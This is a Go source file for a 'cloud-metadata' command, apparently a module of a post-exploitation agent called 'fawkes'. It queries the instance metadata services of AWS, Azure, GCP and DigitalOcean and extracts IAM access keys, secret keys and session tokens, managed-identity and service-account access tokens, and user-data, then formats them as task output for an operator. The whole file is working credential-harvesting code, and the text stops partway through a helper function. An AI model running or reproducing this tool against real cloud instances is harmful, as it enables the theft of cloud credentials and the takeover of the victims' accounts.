package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type CloudMetadataCommand struct{}

func (c *CloudMetadataCommand) Name() string { return "cloud-metadata" }
func (c *CloudMetadataCommand) Description() string {
	return "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials and instance info"
}

type cloudMetadataArgs struct {
	Action   string `json:"action"`   // detect, all, creds, identity, userdata, network
	Provider string `json:"provider"` // auto, aws, azure, gcp, digitalocean
	Timeout  int    `json:"timeout"`  // per-request timeout in seconds (default: 3)
}

const (
	// Metadata service endpoints
	awsMetadataBase = "http://169.254.169.254"
	awsTokenURL     = awsMetadataBase + "/latest/api/token"
	awsMetaURL      = awsMetadataBase + "/latest/meta-data/"
	awsCredsURL     = awsMetadataBase + "/latest/meta-data/iam/security-credentials/"
	awsIdentityURL  = awsMetadataBase + "/latest/dynamic/instance-identity/document"
	awsUserdataURL  = awsMetadataBase + "/latest/user-data"

	azureMetadataBase = "http://169.254.169.254"
	azureInstanceURL  = azureMetadataBase + "/metadata/instance?api-version=2021-02-01"
	azureTokenURL     = azureMetadataBase + "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

	gcpMetadataBase   = "http://metadata.google.internal"
	gcpProjectURL     = gcpMetadataBase + "/computeMetadata/v1/project/"
	gcpInstanceURL    = gcpMetadataBase + "/computeMetadata/v1/instance/"
	gcpTokenURL       = gcpMetadataBase + "/computeMetadata/v1/instance/service-accounts/default/token"
	gcpServiceAcctURL = gcpMetadataBase + "/computeMetadata/v1/instance/service-accounts/"

	doMetadataBase = "http://169.254.169.254"
	doMetadataURL  = doMetadataBase + "/metadata/v1.json"

	defaultCloudTimeout = 3
	metadataMaxSize     = 64 * 1024 // 64KB per response
)

func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult {
	args := cloudMetadataArgs{Action: "detect", Provider: "auto", Timeout: defaultCloudTimeout}
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	if args.Action == "" {
		args.Action = "detect"
	}
	if args.Provider == "" {
		args.Provider = "auto"
	}
	if args.Timeout <= 0 {
		args.Timeout = defaultCloudTimeout
	}

	timeout := time.Duration(args.Timeout) * time.Second
	var sb strings.Builder

	switch args.Action {
	case "detect":
		return cloudDetect(timeout)
	case "all":
		return cloudAll(args.Provider, timeout)
	case "creds", "iam":
		return cloudCreds(args.Provider, timeout)
	case "identity":
		return cloudIdentity(args.Provider, timeout)
	case "userdata":
		return cloudUserdata(args.Provider, timeout)
	case "network":
		return cloudNetwork(args.Provider, timeout)
	default:
		sb.WriteString("Error: unknown action. Available: detect, all, creds, identity, userdata, network")
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
}

// cloudDetect probes all providers and reports which one responds
func cloudDetect(timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Instance Detection ===\n\n")

	detected := false

	// AWS: try IMDSv2 first, then v1
	if token := awsGetIMDSv2Token(timeout); token != "" {
		sb.WriteString("[+] AWS EC2 detected (IMDSv2)\n")
		if id := metadataGet(awsMetaURL+"instance-id", timeout, map[string]string{"X-aws-ec2-metadata-token": token}); id != "" {
			sb.WriteString(fmt.Sprintf("    Instance ID: %s\n", id))
		}
		if region := metadataGet(awsMetaURL+"placement/region", timeout, map[string]string{"X-aws-ec2-metadata-token": token}); region != "" {
			sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
		}
		detected = true
	} else if id := metadataGet(awsMetaURL+"instance-id", timeout, nil); id != "" {
		sb.WriteString("[+] AWS EC2 detected (IMDSv1 — no token required)\n")
		sb.WriteString(fmt.Sprintf("    Instance ID: %s\n", id))
		if region := metadataGet(awsMetaURL+"placement/region", timeout, nil); region != "" {
			sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
		}
		detected = true
	}

	// Azure
	if resp := metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"}); resp != "" {
		sb.WriteString("[+] Azure VM detected\n")
		var inst map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &inst); err == nil {
			if compute, ok := inst["compute"].(map[string]interface{}); ok {
				if name, ok := compute["name"].(string); ok {
					sb.WriteString(fmt.Sprintf("    VM Name: %s\n", name))
				}
				if loc, ok := compute["location"].(string); ok {
					sb.WriteString(fmt.Sprintf("    Location: %s\n", loc))
				}
			}
		}
		detected = true
	}

	// GCP
	if projID := metadataGet(gcpProjectURL+"project-id", timeout, map[string]string{"Metadata-Flavor": "Google"}); projID != "" {
		sb.WriteString("[+] GCP instance detected\n")
		sb.WriteString(fmt.Sprintf("    Project ID: %s\n", projID))
		if zone := metadataGet(gcpInstanceURL+"zone", timeout, map[string]string{"Metadata-Flavor": "Google"}); zone != "" {
			sb.WriteString(fmt.Sprintf("    Zone: %s\n", zone))
		}
		detected = true
	}

	// DigitalOcean
	if resp := metadataGet(doMetadataURL, timeout, nil); resp != "" {
		sb.WriteString("[+] DigitalOcean droplet detected\n")
		var doMeta map[string]interface{}
		if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
			if id, ok := doMeta["droplet_id"]; ok {
				sb.WriteString(fmt.Sprintf("    Droplet ID: %v\n", id))
			}
			if region, ok := doMeta["region"].(string); ok {
				sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
			}
		}
		detected = true
	}

	if !detected {
		sb.WriteString("[-] No cloud metadata service detected\n")
		sb.WriteString("    Tested: AWS IMDS, Azure IMDS, GCP metadata, DigitalOcean metadata\n")
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// cloudAll dumps all available metadata from the detected/specified provider
func cloudAll(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return structs.CommandResult{
			Output:    "[-] No cloud metadata service detected or specified provider not available",
			Status:    "completed",
			Completed: true,
		}
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsDumpAll(timeout))
		case "azure":
			sb.WriteString(azureDumpAll(timeout))
		case "gcp":
			sb.WriteString(gcpDumpAll(timeout))
		case "digitalocean":
			sb.WriteString(doDumpAll(timeout))
		}
		sb.WriteString("\n")
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// cloudCreds extracts IAM credentials from the detected provider
func cloudCreds(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud IAM Credentials ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return structs.CommandResult{
			Output:    "[-] No cloud metadata service detected or specified provider not available",
			Status:    "completed",
			Completed: true,
		}
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetCreds(timeout))
		case "azure":
			sb.WriteString(azureGetToken(timeout))
		case "gcp":
			sb.WriteString(gcpGetToken(timeout))
		case "digitalocean":
			sb.WriteString("[-] DigitalOcean: No IAM credential endpoint\n")
		}
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// cloudIdentity extracts instance identity information
func cloudIdentity(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Instance Identity ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return structs.CommandResult{
			Output:    "[-] No cloud metadata service detected",
			Status:    "completed",
			Completed: true,
		}
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetIdentity(timeout))
		case "azure":
			sb.WriteString(azureGetIdentity(timeout))
		case "gcp":
			sb.WriteString(gcpGetIdentity(timeout))
		case "digitalocean":
			sb.WriteString(doGetIdentity(timeout))
		}
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// cloudUserdata extracts instance user-data (may contain secrets)
func cloudUserdata(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud User Data ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return structs.CommandResult{
			Output:    "[-] No cloud metadata service detected",
			Status:    "completed",
			Completed: true,
		}
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetUserdata(timeout))
		case "azure":
			sb.WriteString(azureGetUserdata(timeout))
		case "gcp":
			sb.WriteString(gcpGetUserdata(timeout))
		case "digitalocean":
			sb.WriteString(doGetUserdata(timeout))
		}
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// cloudNetwork extracts network configuration
func cloudNetwork(provider string, timeout time.Duration) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Cloud Network Configuration ===\n\n")

	providers := resolveProviders(provider, timeout)
	if len(providers) == 0 {
		return structs.CommandResult{
			Output:    "[-] No cloud metadata service detected",
			Status:    "completed",
			Completed: true,
		}
	}

	for _, p := range providers {
		switch p {
		case "aws":
			sb.WriteString(awsGetNetwork(timeout))
		case "azure":
			sb.WriteString(azureGetNetwork(timeout))
		case "gcp":
			sb.WriteString(gcpGetNetwork(timeout))
		case "digitalocean":
			sb.WriteString(doGetNetwork(timeout))
		}
	}

	return structs.CommandResult{Output: sb.String(), Status: "completed", Completed: true}
}

// --- Helper functions ---

// metadataGet makes a GET request to a metadata endpoint with optional headers
func metadataGet(url string, timeout time.Duration, headers map[string]string) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return ""
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return ""
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, metadataMaxSize))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}

// metadataPut makes a PUT request (used for AWS IMDSv2 token)
func metadataPut(url string, timeout time.Duration, headers map[string]string) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "PUT", url, nil)
	if err != nil {
		return ""
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return ""
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}

// resolveProviders determines which cloud providers to query
func resolveProviders(provider string, timeout time.Duration) []string {
	if provider != "auto" && provider != "" {
		p := strings.ToLower(provider)
		switch p {
		case "aws", "azure", "gcp", "digitalocean":
			return []string{p}
		default:
			return nil
		}
	}

	// Auto-detect: probe all providers
	var found []string
	if awsGetIMDSv2Token(timeout) != "" || metadataGet(awsMetaURL+"instance-id", timeout, nil) != "" {
		found = append(found, "aws")
	}
	if metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"}) != "" {
		found = append(found, "azure")
	}
	if metadataGet(gcpProjectURL+"project-id", timeout, map[string]string{"Metadata-Flavor": "Google"}) != "" {
		found = append(found, "gcp")
	}
	if metadataGet(doMetadataURL, timeout, nil) != "" {
		found = append(found, "digitalocean")
	}
	return found
}

// --- AWS ---

func awsGetIMDSv2Token(timeout time.Duration) string {
	return metadataPut(awsTokenURL, timeout, map[string]string{
		"X-aws-ec2-metadata-token-ttl-seconds": "21600",
	})
}

func awsHeaders(timeout time.Duration) map[string]string {
	if token := awsGetIMDSv2Token(timeout); token != "" {
		return map[string]string{"X-aws-ec2-metadata-token": token}
	}
	return nil
}

func awsDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== AWS EC2 Metadata ===\n")
	h := awsHeaders(timeout)

	paths := []struct {
		label, path string
	}{
		{"Instance ID", "instance-id"},
		{"Instance Type", "instance-type"},
		{"AMI ID", "ami-id"},
		{"Hostname", "hostname"},
		{"Local IPv4", "local-ipv4"},
		{"Public IPv4", "public-ipv4"},
		{"Public Hostname", "public-hostname"},
		{"Region", "placement/region"},
		{"Availability Zone", "placement/availability-zone"},
		{"MAC", "mac"},
		{"Security Groups", "security-groups"},
		{"IAM Role", "iam/info"},
	}

	for _, p := range paths {
		if val := metadataGet(awsMetaURL+p.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("  %-22s %s\n", p.label+":", val))
		}
	}

	// IAM credentials
	sb.WriteString("\n")
	sb.WriteString(awsGetCreds(timeout))

	// User data
	sb.WriteString("\n")
	sb.WriteString(awsGetUserdata(timeout))

	return sb.String()
}

func awsGetCreds(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	roles := metadataGet(awsCredsURL, timeout, h)
	if roles == "" {
		sb.WriteString("[*] AWS: No IAM role attached\n")
		return sb.String()
	}

	for _, role := range strings.Split(roles, "\n") {
		role = strings.TrimSpace(role)
		if role == "" {
			continue
		}
		sb.WriteString(fmt.Sprintf("[+] AWS IAM Role: %s\n", role))
		creds := metadataGet(awsCredsURL+role, timeout, h)
		if creds != "" {
			var credMap map[string]interface{}
			if err := json.Unmarshal([]byte(creds), &credMap); err == nil {
				if ak, ok := credMap["AccessKeyId"].(string); ok {
					sb.WriteString(fmt.Sprintf("    AccessKeyId:     %s\n", ak))
				}
				if sk, ok := credMap["SecretAccessKey"].(string); ok {
					sb.WriteString(fmt.Sprintf("    SecretAccessKey: %s\n", sk))
				}
				if tok, ok := credMap["Token"].(string); ok {
					sb.WriteString(fmt.Sprintf("    Token:           %s...\n", truncate(tok, 40)))
				}
				if exp, ok := credMap["Expiration"].(string); ok {
					sb.WriteString(fmt.Sprintf("    Expiration:      %s\n", exp))
				}
			} else {
				sb.WriteString(fmt.Sprintf("    Raw: %s\n", truncate(creds, 200)))
			}
		}
	}
	return sb.String()
}

func awsGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	doc := metadataGet(awsIdentityURL, timeout, h)
	if doc == "" {
		sb.WriteString("[-] AWS: Could not retrieve identity document\n")
		return sb.String()
	}

	sb.WriteString("[+] AWS Instance Identity Document:\n")
	var idDoc map[string]interface{}
	if err := json.Unmarshal([]byte(doc), &idDoc); err == nil {
		for _, key := range []string{"accountId", "instanceId", "instanceType", "region", "availabilityZone", "architecture", "imageId", "privateIp"} {
			if v, ok := idDoc[key]; ok {
				sb.WriteString(fmt.Sprintf("    %-20s %v\n", key+":", v))
			}
		}
	} else {
		sb.WriteString(fmt.Sprintf("    %s\n", doc))
	}
	return sb.String()
}

func awsGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	ud := metadataGet(awsUserdataURL, timeout, h)
	if ud == "" {
		sb.WriteString("[*] AWS: No user-data configured\n")
	} else {
		sb.WriteString("[+] AWS User Data:\n")
		sb.WriteString(truncate(ud, 4096))
		sb.WriteString("\n")
	}
	return sb.String()
}

func awsGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := awsHeaders(timeout)

	sb.WriteString("[+] AWS Network:\n")
	for _, item := range []struct{ label, path string }{
		{"Local IPv4", "local-ipv4"},
		{"Public IPv4", "public-ipv4"},
		{"MAC", "mac"},
		{"VPC ID", "network/interfaces/macs/"},
		{"Subnet ID", "network/interfaces/macs/"},
	} {
		if val := metadataGet(awsMetaURL+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("    %-18s %s\n", item.label+":", val))
		}
	}

	// Get network interface details via MAC
	mac := metadataGet(awsMetaURL+"mac", timeout, h)
	if mac != "" {
		macPath := fmt.Sprintf("network/interfaces/macs/%s/", mac)
		for _, item := range []struct{ label, subpath string }{
			{"VPC ID", "vpc-id"},
			{"Subnet ID", "subnet-id"},
			{"Security Groups", "security-group-ids"},
		} {
			if val := metadataGet(awsMetaURL+macPath+item.subpath, timeout, h); val != "" {
				sb.WriteString(fmt.Sprintf("    %-18s %s\n", item.label+":", val))
			}
		}
	}

	return sb.String()
}

// --- Azure ---

func azureDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== Azure VM Metadata ===\n")
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve instance metadata\n")
		return sb.String()
	}

	var inst map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
		if compute, ok := inst["compute"].(map[string]interface{}); ok {
			for _, key := range []string{"name", "vmId", "vmSize", "location", "resourceGroupName", "subscriptionId", "osType", "offer", "publisher", "sku", "version", "zone"} {
				if v, ok := compute[key]; ok && v != "" {
					sb.WriteString(fmt.Sprintf("  %-24s %v\n", key+":", v))
				}
			}
			if tags, ok := compute["tagsList"].([]interface{}); ok && len(tags) > 0 {
				sb.WriteString("  Tags:\n")
				for _, t := range tags {
					if tag, ok := t.(map[string]interface{}); ok {
						sb.WriteString(fmt.Sprintf("    %v = %v\n", tag["name"], tag["value"]))
					}
				}
			}
		}
		if network, ok := inst["network"].(map[string]interface{}); ok {
			sb.WriteString("  Network:\n")
			if ifaces, ok := network["interface"].([]interface{}); ok {
				for _, iface := range ifaces {
					if m, ok := iface.(map[string]interface{}); ok {
						if ipv4, ok := m["ipv4"].(map[string]interface{}); ok {
							if addrs, ok := ipv4["ipAddress"].([]interface{}); ok {
								for _, a := range addrs {
									if addr, ok := a.(map[string]interface{}); ok {
										sb.WriteString(fmt.Sprintf("    Private IP: %v  Public IP: %v\n", addr["privateIpAddress"], addr["publicIpAddress"]))
									}
								}
							}
						}
					}
				}
			}
		}
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", truncate(resp, 2000)))
	}

	sb.WriteString("\n")
	sb.WriteString(azureGetToken(timeout))
	sb.WriteString("\n")
	sb.WriteString(azureGetUserdata(timeout))

	return sb.String()
}

func azureGetToken(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureTokenURL, timeout, h)
	if resp == "" {
		sb.WriteString("[*] Azure: No managed identity configured or token unavailable\n")
		return sb.String()
	}

	var token map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &token); err == nil {
		sb.WriteString("[+] Azure Managed Identity Token:\n")
		if at, ok := token["access_token"].(string); ok {
			sb.WriteString(fmt.Sprintf("    Access Token: %s...\n", truncate(at, 60)))
		}
		if rt, ok := token["resource"].(string); ok {
			sb.WriteString(fmt.Sprintf("    Resource:     %s\n", rt))
		}
		if exp, ok := token["expires_on"].(string); ok {
			sb.WriteString(fmt.Sprintf("    Expires On:   %s\n", exp))
		}
	} else {
		sb.WriteString(fmt.Sprintf("[+] Azure Token (raw): %s\n", truncate(resp, 200)))
	}
	return sb.String()
}

func azureGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve identity\n")
		return sb.String()
	}

	var inst map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
		sb.WriteString("[+] Azure Identity:\n")
		if compute, ok := inst["compute"].(map[string]interface{}); ok {
			for _, key := range []string{"name", "vmId", "subscriptionId", "resourceGroupName", "location", "osType"} {
				if v, ok := compute[key]; ok && v != "" {
					sb.WriteString(fmt.Sprintf("    %-22s %v\n", key+":", v))
				}
			}
		}
	}
	return sb.String()
}

func azureGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	udURL := azureMetadataBase + "/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
	ud := metadataGet(udURL, timeout, h)
	if ud == "" {
		sb.WriteString("[*] Azure: No user-data configured\n")
	} else {
		sb.WriteString("[+] Azure User Data (base64):\n")
		sb.WriteString(truncate(ud, 4096))
		sb.WriteString("\n")
	}
	return sb.String()
}

func azureGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata": "true"}

	resp := metadataGet(azureInstanceURL, timeout, h)
	if resp == "" {
		sb.WriteString("[-] Azure: Could not retrieve network info\n")
		return sb.String()
	}

	var inst map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &inst); err == nil {
		sb.WriteString("[+] Azure Network:\n")
		if network, ok := inst["network"].(map[string]interface{}); ok {
			if ifaces, ok := network["interface"].([]interface{}); ok {
				for i, iface := range ifaces {
					if m, ok := iface.(map[string]interface{}); ok {
						sb.WriteString(fmt.Sprintf("  Interface %d:\n", i))
						if mac, ok := m["macAddress"].(string); ok {
							sb.WriteString(fmt.Sprintf("    MAC: %s\n", mac))
						}
						if ipv4, ok := m["ipv4"].(map[string]interface{}); ok {
							if addrs, ok := ipv4["ipAddress"].([]interface{}); ok {
								for _, a := range addrs {
									if addr, ok := a.(map[string]interface{}); ok {
										sb.WriteString(fmt.Sprintf("    Private: %v  Public: %v\n", addr["privateIpAddress"], addr["publicIpAddress"]))
									}
								}
							}
							if subnets, ok := ipv4["subnet"].([]interface{}); ok {
								for _, s := range subnets {
									if subnet, ok := s.(map[string]interface{}); ok {
										sb.WriteString(fmt.Sprintf("    Subnet: %v/%v\n", subnet["address"], subnet["prefix"]))
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return sb.String()
}

// --- GCP ---

func gcpDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== GCP Instance Metadata ===\n")
	h := map[string]string{"Metadata-Flavor": "Google"}

	items := []struct {
		label, path string
	}{
		{"Project ID", "project/project-id"},
		{"Numeric Project ID", "project/numeric-project-id"},
		{"Instance Name", "instance/name"},
		{"Instance ID", "instance/id"},
		{"Machine Type", "instance/machine-type"},
		{"Zone", "instance/zone"},
		{"Hostname", "instance/hostname"},
		{"CPU Platform", "instance/cpu-platform"},
		{"Image", "instance/image"},
		{"Tags", "instance/tags"},
	}

	for _, item := range items {
		if val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/"+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("  %-22s %s\n", item.label+":", val))
		}
	}

	sb.WriteString("\n")
	sb.WriteString(gcpGetToken(timeout))
	sb.WriteString("\n")
	sb.WriteString(gcpGetUserdata(timeout))

	return sb.String()
}

func gcpGetToken(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	// List service accounts
	accts := metadataGet(gcpServiceAcctURL, timeout, h)
	if accts == "" {
		sb.WriteString("[*] GCP: No service accounts attached\n")
		return sb.String()
	}

	for _, acct := range strings.Split(accts, "\n") {
		acct = strings.TrimSpace(acct)
		if acct == "" {
			continue
		}
		sb.WriteString(fmt.Sprintf("[+] GCP Service Account: %s\n", acct))

		// Get email
		email := metadataGet(gcpServiceAcctURL+acct+"email", timeout, h)
		if email != "" {
			sb.WriteString(fmt.Sprintf("    Email: %s\n", email))
		}

		// Get scopes
		scopes := metadataGet(gcpServiceAcctURL+acct+"scopes", timeout, h)
		if scopes != "" {
			sb.WriteString(fmt.Sprintf("    Scopes: %s\n", strings.ReplaceAll(scopes, "\n", ", ")))
		}

		// Get token
		tokenResp := metadataGet(gcpServiceAcctURL+acct+"token", timeout, h)
		if tokenResp != "" {
			var token map[string]interface{}
			if err := json.Unmarshal([]byte(tokenResp), &token); err == nil {
				if at, ok := token["access_token"].(string); ok {
					sb.WriteString(fmt.Sprintf("    Access Token: %s...\n", truncate(at, 60)))
				}
				if exp, ok := token["expires_in"]; ok {
					sb.WriteString(fmt.Sprintf("    Expires In:   %v seconds\n", exp))
				}
			}
		}
	}
	return sb.String()
}

func gcpGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	sb.WriteString("[+] GCP Instance Identity:\n")
	for _, item := range []struct{ label, path string }{
		{"Name", "instance/name"},
		{"ID", "instance/id"},
		{"Zone", "instance/zone"},
		{"Machine Type", "instance/machine-type"},
		{"Project", "project/project-id"},
		{"Hostname", "instance/hostname"},
	} {
		if val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/"+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("    %-16s %s\n", item.label+":", val))
		}
	}
	return sb.String()
}

func gcpGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	// GCP stores user data in instance attributes
	ud := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/attributes/", timeout, h)
	if ud == "" {
		sb.WriteString("[*] GCP: No instance attributes configured\n")
		return sb.String()
	}

	sb.WriteString("[+] GCP Instance Attributes:\n")
	for _, attr := range strings.Split(ud, "\n") {
		attr = strings.TrimSpace(attr)
		if attr == "" {
			continue
		}
		val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/attributes/"+attr, timeout, h)
		sb.WriteString(fmt.Sprintf("    %s: %s\n", attr, truncate(val, 500)))
	}
	return sb.String()
}

func gcpGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	sb.WriteString("[+] GCP Network:\n")

	// Get network interfaces
	ifaces := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/network-interfaces/", timeout, h)
	if ifaces == "" {
		sb.WriteString("    No network interface info available\n")
		return sb.String()
	}

	for _, idx := range strings.Split(ifaces, "\n") {
		idx = strings.TrimSpace(idx)
		if idx == "" {
			continue
		}
		basePath := gcpMetadataBase + "/computeMetadata/v1/instance/network-interfaces/" + idx
		sb.WriteString(fmt.Sprintf("  Interface %s\n", strings.TrimSuffix(idx, "/")))
		for _, item := range []struct{ label, sub string }{
			{"IP", "ip"},
			{"Network", "network"},
			{"Subnetwork", "subnetwork"},
			{"Gateway", "gateway"},
			{"MAC", "mac"},
		} {
			if val := metadataGet(basePath+item.sub, timeout, h); val != "" {
				sb.WriteString(fmt.Sprintf("    %-14s %s\n", item.label+":", val))
			}
		}

		// Access configs (external IP)
		acIdx := metadataGet(basePath+"access-configs/", timeout, h)
		if acIdx != "" {
			for _, ac := range strings.Split(acIdx, "\n") {
				ac = strings.TrimSpace(ac)
				if ac == "" {
					continue
				}
				if extIP := metadataGet(basePath+"access-configs/"+ac+"external-ip", timeout, h); extIP != "" {
					sb.WriteString(fmt.Sprintf("    External IP:   %s\n", extIP))
				}
			}
		}
	}
	return sb.String()
}

// --- DigitalOcean ---

func doDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== DigitalOcean Droplet Metadata ===\n")

	resp := metadataGet(doMetadataURL, timeout, nil)
	if resp == "" {
		sb.WriteString("[-] Could not retrieve DO metadata\n")
		return sb.String()
	}

	var doMeta map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
		for _, key := range []string{"droplet_id", "hostname", "region", "vendor_data", "public_keys"} {
			if v, ok := doMeta[key]; ok {
				sb.WriteString(fmt.Sprintf("  %-18s %v\n", key+":", v))
			}
		}
		if ifaces, ok := doMeta["interfaces"].(map[string]interface{}); ok {
			for netType, nets := range ifaces {
				if netSlice, ok := nets.([]interface{}); ok {
					for _, n := range netSlice {
						if net, ok := n.(map[string]interface{}); ok {
							sb.WriteString(fmt.Sprintf("  %s: ip=%v mac=%v\n", netType, net["ipv4"], net["mac"]))
						}
					}
				}
			}
		}
	} else {
		sb.WriteString(truncate(resp, 2000))
	}

	sb.WriteString("\n")
	sb.WriteString(doGetUserdata(timeout))
	return sb.String()
}

func doGetIdentity(timeout time.Duration) string {
	var sb strings.Builder

	resp := metadataGet(doMetadataURL, timeout, nil)
	if resp == "" {
		sb.WriteString("[-] DigitalOcean: Could not retrieve identity\n")
		return sb.String()
	}

	var doMeta map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
		sb.WriteString("[+] DigitalOcean Identity:\n")
		for _, key := range []string{"droplet_id", "hostname", "region"} {
			if v, ok := doMeta[key]; ok {
				sb.WriteString(fmt.Sprintf("    %-14s %v\n", key+":", v))
			}
		}
	}
	return sb.String()
}

func doGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	ud := metadataGet(doMetadataBase+"/metadata/v1/user-data", timeout, nil)
	if ud == "" {
		sb.WriteString("[*] DigitalOcean: No user-data configured\n")
	} else {
		sb.WriteString("[+] DigitalOcean User Data:\n")
		sb.WriteString(truncate(ud, 4096))
		sb.WriteString("\n")
	}
	return sb.String()
}

func doGetNetwork(timeout time.Duration) string {
	var sb strings.Builder

	resp := metadataGet(doMetadataURL, timeout, nil)
	if resp == "" {
		sb.WriteString("[-] DigitalOcean: Could not retrieve network info\n")
		return sb.String()
	}

	var doMeta map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &doMeta); err == nil {
		sb.WriteString("[+] DigitalOcean Network:\n")
		if ifaces, ok := doMeta["interfaces"].(map[string]interface{}); ok {
			for netType, nets := range ifaces {
				if netSlice, ok := nets.([]interface{}); ok {
					for _, n := range netSlice {
						if net, ok := n.(map[string]interface{}); ok {
							sb.WriteString(fmt.Sprintf("  %s:\n", netType))
							if ipv4, ok := net["ipv4"].(map[string]interface{}); ok {
								sb.WriteString(fmt.Sprintf("    IPv4: %v  Netmask: %v  Gateway: %v\n",
									ipv4["ip_address"], ipv4["netmask"], ipv4["gateway"]))
							}
							if mac, ok := net["mac"].(string); ok {
								sb.WriteString(fmt.Sprintf("    MAC:  %s\n", mac))
							}
						}
					}
				}
			}
		}
	}
	return sb.String()
}

// truncate returns the first n characters of a string
func truncate(s string, n int) string {
